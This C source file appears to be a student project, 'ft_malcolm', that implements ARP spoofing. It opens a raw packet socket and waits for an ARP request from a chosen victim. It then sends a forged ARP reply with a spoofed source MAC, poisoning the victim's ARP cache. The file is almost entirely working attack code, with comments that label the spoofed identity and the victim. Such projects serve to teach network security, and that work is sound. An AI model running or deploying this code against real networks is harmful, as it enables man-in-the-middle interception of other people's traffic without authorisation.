#include "ft_malcolm.h"

volatile sig_atomic_t g_running = 1;

void handle_sigint(int sig) {
    (void)sig;
    g_running = 0;
    ft_putstr_fd("\n[ft_malcolm]\tRecieved Ctrl+c signal, exiting right now...\n", 2);
    exit(EXIT_SUCCESS);
}

void print_help(int ac, char **av)
{
    (void) av;
    if (ac < 5)
    {
        ft_putstr_fd("[ft_malcolm] not enough arguments.\n", 2);
        return;
    }
    return;
}

int create_socket(t_session *session, char *interface)
{
    unsigned int ifindex;

    ifindex = if_nametoindex(interface);
    if (ifindex == 0)
    {
        perror("if_nametoindex failed");
        return (-1);
    }

    ft_memset(&session->sll, 0, sizeof(session->sll));
    session->sll.sll_family = AF_PACKET;
    session->sll.sll_ifindex = (int)ifindex;
    session->sll.sll_protocol = htons(ETH_P_ARP);

    session->sockfd = socket(
            session->sll.sll_family, SOCK_RAW, session->sll.sll_protocol);
    if (session->sockfd < 0)
    {
        ft_putstr_fd("[ft_malcolm] Socket creation failed.\n", 2);
        ft_putstr_fd("[ft_malcolm] Try running the ft_malcolm with sudo.\n", 2);
        return -1;
    }

    return (session->sockfd);
}


int parse_mac(const char *mac_str, unsigned char *mac_out)
{
    int bytes[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6)
    {
        return (-1);
    }

    for (int i = 0; i < 6; i++) {
        if (bytes[i] < 0 || bytes[i] > 255)
            return (-1);
        mac_out[i] = (unsigned char)bytes[i];
    }
    return (0);
}

int parse_args(t_options *opts)
{
    if (!opts->src_ip_str || !opts->src_mac_str || !opts->target_ip_str || !opts->target_mac_str)
    {
        ft_putstr_fd("ft_malcolm: parsing went wrong!", 2);
        ft_putstr_fd("\n", 2);
        return -1;
    }

    if (inet_pton(AF_INET, opts->src_ip_str, &opts->src_ip) != 1) {
        ft_putstr_fd("ft_malcolm: invalid IP address: (%s) ", 2);
        ft_putstr_fd(opts->src_ip_str, 2);
        ft_putstr_fd("\n", 2);
        return (-1);
    }

    if (parse_mac(opts->src_mac_str, opts->src_mac) < 0) {
        ft_putstr_fd("ft_malcolm: invalid mac address: (%s) ", 2);
        ft_putstr_fd(opts->src_mac_str, 2);
        ft_putstr_fd(".\n", 2);
        return (-1);
    }

    if (inet_pton(AF_INET, opts->target_ip_str, &opts->target_ip) != 1) {
        ft_putstr_fd("ft_malcolm: invalid IP address: (%s) ", 2);
        ft_putstr_fd(opts->target_ip_str, 2);
        ft_putstr_fd("\n", 2);
        return (-1);
    }

    if (parse_mac(opts->target_mac_str, opts->target_mac) < 0) {
        ft_putstr_fd("ft_malcolm: invalid mac address: (%s) ", 2);
        ft_putstr_fd(opts->target_mac_str, 2);
        ft_putstr_fd("\n", 2);
        return (-1);
    }

    return (0);
}

char *get_interface()
{
    struct ifaddrs *ifaddr, *ifa;
    static char iface_name[IF_NAMESIZE];

    if (getifaddrs(&ifaddr) == -1)
    {
        ft_putstr_fd("getifaddrs", 2);
        return (NULL);

    }
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        /* Ensure interface address structure is present */
        if (ifa->ifa_addr == NULL)
            continue;

        /* Filter for Layer 2 AF_PACKET interfaces */
        if (ifa->ifa_addr->sa_family == AF_PACKET)
        {
            unsigned int flags = ifa->ifa_flags;

            /* Must be UP, RUNNING, and NOT Loopback */
            if ((flags & IFF_UP) && (flags & IFF_RUNNING) && !(flags & IFF_LOOPBACK))
            {
                strncpy(iface_name, ifa->ifa_name, IF_NAMESIZE - 1);
                iface_name[IF_NAMESIZE - 1] = '\0';
                freeifaddrs(ifaddr);
                return (iface_name);
            }
        }
    }

    freeifaddrs(ifaddr);
    return (NULL);
}

int send_arp_reply(t_session *session, t_options *opts)
{
    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    struct ethhdr *eth = (struct ethhdr *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

    ft_memset(buffer, 0, sizeof(buffer));

    /* 1. Ethernet Header */
    ft_memcpy(eth->h_dest, opts->target_mac, 6);       /* Unicast to Target */
    ft_memcpy(eth->h_source, opts->src_mac, 6);        /* Spoofed Source MAC */
    eth->h_proto = htons(ETH_P_ARP);

    /* 2. ARP Reply Header */
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);        /* Opcode 2 = Reply */

    /* Sender Info (Spoofed Identity) */
    ft_memcpy(arp->arp_sha, opts->src_mac, 6);
    ft_memcpy(arp->arp_spa, &opts->src_ip, 4);

    /* Target Info (Victim Identity) */
    ft_memcpy(arp->arp_tha, opts->target_mac, 6);
    ft_memcpy(arp->arp_tpa, &opts->target_ip, 4);

    /* 3. Send over the EXISTING socket */
    if (sendto(session->sockfd, buffer, sizeof(buffer), 0,
               (struct sockaddr *)&session->sll, sizeof(session->sll)) < 0)
    {
        ft_putstr_fd("[ft_malcolm] sendto() failed.\n", 2);
        return (-1);
    }

    return (0);
}

int work(t_options opts)
{
    t_session session;

    char buffer[1024];
    char *interface = get_interface();
    printf("Network Interface: %s\n", interface);
    if (!interface)
    {
        ft_putstr_fd("[ft_malcolm] get_interface failed.\n", 2);
        return -1;
    }

    if (create_socket(&session, interface) == -1)
    {
        ft_putstr_fd("[ft_malcolm] create_socket failed.\n", 2);
        return -1;
    }

    while (g_running)
    {
        printf("we are listening for incoming arp requests.\n");
        struct sockaddr_ll src_addr;
        socklen_t addr_len = sizeof(src_addr);

        int bytes = recvfrom(session.sockfd,
                buffer, sizeof(buffer), 0, (struct sockaddr *)&src_addr, &addr_len);

        if (bytes < 0)
        {
            ft_putstr_fd("[ft_malcolm] recvfrom() failed.\n", 2);
            close(session.sockfd);
            return 1;
        }

        if ((size_t)bytes < sizeof(struct ethhdr) + sizeof(struct ether_arp))
            continue;

        struct ethhdr *eth = (struct ethhdr *)buffer;
        if (ntohs(eth->h_proto) == ETH_P_ARP)
        {
            struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST)
            {
                char captured_spa[16], captured_tpa[16];
                char expected_target[16], expected_src[16];

                inet_ntop(AF_INET, arp->arp_spa, captured_spa, sizeof(captured_spa));
                inet_ntop(AF_INET, arp->arp_tpa, captured_tpa, sizeof(captured_tpa));
                inet_ntop(AF_INET, &opts.target_ip, expected_target, sizeof(expected_target));
                inet_ntop(AF_INET, &opts.src_ip, expected_src, sizeof(expected_src));

                printf("--- CAPTURED REQUEST ---\n");
                printf("Sender IP : %s (Expected Target: %s)\n", captured_spa, expected_target);
                printf("Target IP : %s (Expected Source: %s)\n", captured_tpa, expected_src);
                printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                        arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2],
                        arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
                printf("Expected MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                        opts.target_mac[0], opts.target_mac[1], opts.target_mac[2],
                        opts.target_mac[3], opts.target_mac[4], opts.target_mac[5]);
                printf("------------------------\n");

                printf("we are waitiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiing\n");
                if (memcmp(arp->arp_spa, &opts.target_ip, 4) == 0 &&
                        memcmp(arp->arp_sha, opts.target_mac, 6) == 0 &&
                        memcmp(arp->arp_tpa, &opts.src_ip, 4) == 0)
                {
                    printf("Matching ARP request detected! Preparing reply...\n");
                    send_arp_reply(&session, &opts);
                    printf("ARP reply was sent! Exiting right now...\n");
                    break;
                }
            }
        }
    }

    return 0;
}

int parse_mac_bytes(const char *mac_str, unsigned char *mac_out)
{
    int bytes[6];

    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6)
        return (-1);

    for (int i = 0; i < 6; i++)
    {
        if (bytes[i] < 0 || bytes[i] > 255)
            return (-1);
        mac_out[i] = (unsigned char)bytes[i];
    }
    return (0);
}

int fill_opts(char **av, t_options *opts)
{
    opts->src_ip_str = ft_strdup(av[1]);
    opts->src_mac_str = ft_strdup(av[2]);
    opts->target_ip_str = ft_strdup(av[3]);
    opts->target_mac_str = ft_strdup(av[4]);
    if (!opts->src_ip_str || !opts->src_mac_str || !opts->target_mac_str || !opts->target_ip_str)
    {
        ft_putstr_fd("[ft_malcolm] strdup failed.\n", 2);
        return -1;
    }

    if (inet_pton(AF_INET, opts->src_ip_str, &opts->src_ip) != 1)
    {
        fprintf(stderr, "ft_malcolm: invalid IP address: (%s)\n", opts->src_ip_str);
        return (-1);
    }

    if (parse_mac_bytes(opts->src_mac_str, opts->src_mac) < 0)
    {
        fprintf(stderr, "ft_malcolm: invalid mac address: (%s)\n", opts->src_mac_str);
        return (-1);
    }

    if (inet_pton(AF_INET, opts->target_ip_str, &opts->target_ip) != 1)
    {
        fprintf(stderr, "ft_malcolm: invalid IP address: (%s)\n", opts->target_ip_str);
        return (-1);
    }

    if (parse_mac_bytes(opts->target_mac_str, opts->target_mac) < 0)
    {
        fprintf(stderr, "ft_malcolm: invalid mac address: (%s)\n", opts->target_mac_str);
        return (-1);
    }
    return 0;
}
